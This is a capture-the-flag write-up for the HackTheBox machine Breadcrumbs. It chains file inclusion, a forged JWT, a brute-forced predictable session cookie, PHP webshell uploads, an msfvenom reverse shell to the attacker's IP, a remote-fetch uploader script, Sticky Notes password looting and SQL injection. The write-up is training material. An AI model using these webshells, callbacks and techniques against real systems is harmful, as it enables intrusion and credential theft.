---
title: Breadcrumbs Writeup [HTB]
tags: [HackTheBox, Local File Inclusion, SQL Injection, Json Web Token, php]
image: /assets/images/breadcrumbs/breadcrumbs.png
published: true
banner: true
---

Breadcrumbs is a Windows based machine that was active since February 20th of 2021 to July 17th, on this machine we will have to follow a lot of different clues to get access as administrator user, first we will find a File Inclusion vulnerability that we will use to retrieve the backend code and look for vulnerabilities along the way, on another site of the webserver we will find a file upload function, but only paul user can use it, so we will have to build a valid JWT and a PHP cookie to get access to it, once we have access to the upload function we will get a not very reliable shell with it, run winPEAS.bat since there is something blocking the exe version, and find the password of www-data to get access to it over SSH, with this user we will find the password of another user near the source code of the webpage, this new user uses Microsoft Sticky Notes to store passwords, so we locate the sqlite file that stores his notes and dump the password of another user, this users has access to a binary file that makes some requests to a website on port 1234, using SSH we make a port forwarding to access to that port and dump the database that that site is using through SQL injection, on the dumped database que find the password of administrator encrypted with AES, but the keys used is also there, so we decrypt it and finish with the machine.

# [](#header-1)Enumeration

We start using masscan to find all the available ports and then use nmap to get more information about them.

```bash
masscan -e tun0 --rate=500 -p 0-65535 10.10.10.228
nmap -sC -sV -p 22,80,5040,49665,7680,49666,3306,135,445,49668,49669,139,443,49667,49664, -Pn -o scan.txt 10.10.10.228

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)
|   256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
|_  256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   Help, LPDString, NCP, SMBProgNeg, TLSSessionReq, TerminalServer, TerminalServerCookie: 
|_    Host '10.10.16.42' is not allowed to connect to this MariaDB server
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC

Host script results:
|_clock-skew: -56m11s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-23T12:25:07
|_  start_date: N/A
```

There is a ton a ports open and we can say that it is a windows box, it has a website running under apache and it's using PHP, and also has SSH running, pretty weird for a Windows box, we don't have access to any SMB share so we start by looking at the website.

![](/assets/images/breadcrumbs/website.png)

It seems like a library page that could allow us to requests for books. If we access to check books we get to a search function.

![](/assets/images/breadcrumbs/search.png)

If we try to book any book we get some information about it, but if we try to book we get a message that the book isn't available.

![](/assets/images/breadcrumbs/book.png)

Let's check what request is made when we try to book a book.

![](/assets/images/breadcrumbs/bookreq.png)

## File Inclusion

As we can see it requests the book by its file name, "book3.html", so we might have a file inclusion vulnerability, the file that we are making te request to is bookController.php, we can get it making a request to "../includes/bookController.php".

![](/assets/images/breadcrumbs/bookcr.png)
![](/assets/images/breadcrumbs/bookcrp.png)

As we can see we are able to fetch the file, this also reveals that php is not being executed by this method, se we can't try to get code execution from it, also it makes some changes to the file that makes it harder to read, so we make a little script (well it's more a one liner), to fix any file that we fetch using this method.

```bash
#!/bin/bash
sed 's/\\r\\n/\n/g' $1 | sed 's/\\\"/\"/g' | sed 's/\\\//\//g' > $1.php
rm $1
```

To use it we just need to save the output to a file and running this script will fix the garbage, so let's fix bookController.php.

![](/assets/images/breadcrumbs/bookcontroller.png)

We see that it uses `file_get_contents`, not include, so that's why php wasn't executed, it also points to a db file, but nmap showed us that we can't access to the DB from our IP, and the passsword gotten from it isn't reused anywhere, so we will skip that. While we were testing this vulnerability we left feroxbuster the on background looking for any other file or directory, `feroxbuster -u http://10.10.10.228/ -w ~/tools/SecLists-master/Discovery/Web-Content/raft-small-directories-lowercase.txt -x php,txt -o busters.txt -n`.

![](/assets/images/breadcrumbs/feroxbuster.png)

Among the found directories we see portal, so we visit it and find a login page.

![](/assets/images/breadcrumbs/portal.png)

We don't have credentials to access to the site, but we can create an account, so we create one and access.

![](/assets/images/breadcrumbs/logedportal.png)

Now we can explore the inner functions, if we try to access to File Management we are redirected back to the main page, so let's use the File Inclusion to read that file, we request "../portal/php/files.php", and clean it with the script.

![](/assets/images/breadcrumbs/files.png)

As we can see only paul has access, but the site only sends a 302 header, so we can enable intercept responses on Burp, and edit it.

Original

![](/assets/images/breadcrumbs/orirep.png)

Edited

![](/assets/images/breadcrumbs/edirep.png)

Once we do that, we access to a page were we can upload files, so let's try to upload simple php file that echoes something.

![](/assets/images/breadcrumbs/upload.png)

And then we get an error message.

![](/assets/images/breadcrumbs/uploaderror.png)

Again let's use the file inclusion to get the file, on this case the request was made to "/portal/includes/fileController.php", so we request "../portal/includes/fileController.php", and fix it with the script.

```php
<?php
$ret = "";
require "../vendor/autoload.php";
use \\Firebase\\JWT\\JWT;
session_start();

function validate(){
    $ret = false;
    $jwt = $_COOKIE['token'];

    $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
    $ret = JWT::decode($jwt, $secret_key, array('HS256'));   
    return $ret;
}

if($_SERVER['REQUEST_METHOD'] === "POST"){
    $admins = array("paul");
    $user = validate()->data->username;
    if(in_array($user, $admins) && $_SESSION['username'] == "paul"){
        error_reporting(E_ALL & ~E_NOTICE);
        $uploads_dir = '../uploads';
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_POST['task'];

        if(move_uploaded_file($tmp_name, "$uploads_dir/$name")){
            $ret = "Success. Have a great weekend!";
        }     
        else{
            $ret = "Missing file or title :(" ;
        }
    }
    else{
        $ret = "Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.";
    }

    echo $ret;
}
```

Here two validations are made, first that the user to whom the PHP session cookie belongs is "paul", and also that the JWT belongs to him, we can't just bypass this by editing the response. So let's start by addressing the JWT, we have the key used to verify it, so we can go to [jwt.io](https://jwt.io/), put our JWT, use that key, and edit it so the username is paul.

![](/assets/images/breadcrumbs/jwt.png)

## Hijacking paul user

To deal with the PHP session cookie we have to go back where we were inspecting the site, there is an issues page, so let's see what it says.

![](/assets/images/breadcrumbs/issues.png)

There are two things that call out attention, there seems to be something wrong with the logout button, and also the PHP cookies seems to be lasting for ever, so let's inspect the logout button first, let's request "../portal/auth/logout.php", and fix it.

```php
<?php 
/*
session_start();
$_SESSION = array();
if (ini_get("session.use_cookies")) {
    $params = session_get_cookie_params();
    setcookie(session_name(), '', time() - 42000,
        $params["path"], $params["domain"],
        $params["secure"], $params["httponly"]
    );
}
if (isset($_SERVER['HTTP_COOKIE'])) {
    $cookies = explode(';', $_SERVER['HTTP_COOKIE']);
    foreach($cookies as $cookie) {
        $parts = explode('=', $cookie);
        $name = trim($parts[0]);
        setcookie($name, '', time()-1000);
        setcookie($name, '', time()-1000, '/');
    }
}
session_destroy();
session_write_close();
*/
header('Location: login.php');
?>
```

The button doesn't destroy the session, but only sends you to the login page, joining that with the issue of the cookies lasting for ever a cookie for "paul" might be still valid even if he logged out, but PHP cookies are hihgly random, and there is no way of getting it right, well that's for the default cookies, when we logged in on the portal site we got a cookie with our username on it, so let's read to see how it is generated. To do so we request "../portal/login.php", there we see that it requires "authController.php", so we request "../portal/authController.php", again this file isn't the one that creates the cookie, it requires "cookie.php", so we read it.

```php
<?php
/**
 * @param string $username  Username requesting session cookie
 * 
 * @return string $session_cookie Returns the generated cookie
 * 
 * @devteam
 * Please DO NOT use default PHPSESSID; our security team says they are predictable.
 * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
 * */
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}
```

And we see that they have a custom function to generate a cookie since their security team advised to not use the default one, and it's a pretty simple one, it grabs a random letter of the username, puts it in the middle of "s4lTy_stR1nG_" and "(!528./9890", and hashes it with md5, the problem here it that the possible cookies set is really small, we are interested on "paul" user, so there is only 4 possible cookies for him, so let's make a script that generates every possible cookie for him.

```php
<?php

function makesession($username){
    $max = strlen($username);
    for ($seed = 0; $seed < $max; $seed++){
        $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
        $session_cookie = $username.md5($key);
        echo $session_cookie;
        echo "\n";
    }
}

makesession("paul");
?>
```

So let's execute it and save the output to a file, `php cookiegenerator.php > gencook.txt`, if we remember, only paul could access to the File Manager, so let's use ffuf to see which cookie gets accepted

![](/assets/images/breadcrumbs/ffuf.png)

# Getting access

Now that we have a valid PHP cookie and a valid JWT, let's go back to our request to upload the file, edit the cookies, change the extension from .php.zip to .php, and try to upload our file.

![](/assets/images/breadcrumbs/uploadtest.png)
![](/assets/images/breadcrumbs/uploadtestrp.png)

It got uploaded successfully, and if we access to "http://10.10.10.228/portal/uploads/test.php", we get "hola", as response.

![](/assets/images/breadcrumbs/phptest.png)

If we try to upload a file with the typical, `<?php system($_GET['cmd']) ?>`, it will fail, this is not the only what to get a webshell, so we can upload `<?php echo exec($_GET['cmd']) ?>`, anyways spwaning a reverse shell from it wasn't possible, any binary that we upload can't be executed, (probably AV running plus other stuff?), neither powershell reverse shell commands (maybe is running on constrained language), so let's generate a reverse shell on PHP with msfvenom, and upload it, `msfvenom -p php/reverse_php LHOST=10.10.16.42 LPORT=54321`. Once we request our file we get a shell, it's not the most stable one, but is better than the webshell.

![](/assets/images/breadcrumbs/shell1.png)

# Lateral Movement

Similar to the shell, uploading files is annoying, so let's upload a php script that will upload any file from our machine, we will call it uploader.php.

```php
<?php
file_put_contents($_GET['upload'],file_get_contents("http://10.10.16.42:8000/".$_GET['upload']));
?>
```

Since we can't run executable files, let's upload winPEAS.bat, we host it with python http server, and access to `curl 'http://10.10.10.228/portal/uploads/uploader.php?upload=winPEAS.bat'` to upload the file, and execute it on our shell, it takes a while, but at the end we find the credentials of www-data user.

![](/assets/images/breadcrumbs/wwwcred.png)

Using it we can access through SSH.

![](/assets/images/breadcrumbs/shell2.png)

We go to the the root of the webpage to see if we can find useful information inside de source code, and a weird folder calls our attention, C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData, there we see that juliette file isn't disabled, reading it we find the password of juliette.

![](/assets/images/breadcrumbs/pizza.png)

Now we can access as juliette through SSH and retrieve user.txt.

![](/assets/images/breadcrumbs/shell3.png)

# Lateral Movement 2

Inside juliette's Desktop folder we find a filed called todo.html, and there we see something interesting, `Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager`, if we google about where that Program is located we get that it is located at: "C:\Users\username\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\", there is another version that is located at "C:\Users\username\AppData\Roaming\Microsoft\Sticky Notes\", but we won't find it here, also we could use `dir /s /b \*sticy\*`, to find any file/directory that contains that word and find its directory.

![](/assets/images/breadcrumbs/dir.png)

We use scp to download the whole folder and check its contents in our machine, `scp -r juliette@10.10.10.228:\\Users\\juliette\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\ .`.

![](/assets/images/breadcrumbs/sticky.png)

There we find a sqlite database, so we use sqlite3 to access to it, we check the available tables, and we find some passwords on Note table, but the administrator password isn't here, the todo.html file said that they were migrating their password manager, so probably they started by moving the administrator password.

![](/assets/images/breadcrumbs/sqlite.png)

# Privilege Escalation

I didn't show it before, but we checked the shares of the machine with the previous users, this user has access to a share that we didn't have before, development.

![](/assets/images/breadcrumbs/smb.png)

We connect to it and find the file Krypter_Linux inside the share, so we download it to see what it does, we can find this file on C:\development, and download it with scp, but I wanted to use SMB. 

![](/assets/images/breadcrumbs/krypter.png)

We execute it and see that it requieres a key to use it.

![](/assets/images/breadcrumbs/krypterhelp.png)

We use strings searching for the key or any interesting information.

![](/assets/images/breadcrumbs/kryptstrings.png)

There is a url, and it is poiting to port 1234, if we go to our SSH shell and run netstat, we find that port 1234 is listenning locally.

![](/assets/images/breadcrumbs/netstat.png)

So let's forward the port using our SSH shell, we write `~C`, and we will be able to interact with SSH options, there we run `-L 1234:127.0.0.1:1234`, now we use curl to request that port adding the arguments that we saw.

![](/assets/images/breadcrumbs/curl1234.png)

We can guess that the page builds the MySql query similar to: `$_GET['method'] * FROM $_GET['table'] WHERE username = $_GET['username']`, if it's that simple we could performa a SQL injection easily, but we use sqlmap to speed up the process, and we dump the table.

![](/assets/images/breadcrumbs/table.png)

It says that it is using an AES key, so we know that the password is encrypted with AES, so we go to a [site](https://www.devglan.com/online-tools/aes-encryption-decryption) that decrypts AES text, select CBC mode, and we will get the password of administrator and finish with the machine.

![](/assets/images/breadcrumbs/root.png)

But we have one question, why we were able to decrypt the password without the IV? Well when you don't put an IV it is asumed to use null bytes as IV, for example using cyberchef we have to specify a lot of 0 on HEX as IV, and it will give us the password.

![](/assets/images/breadcrumbs/cyberchef.png)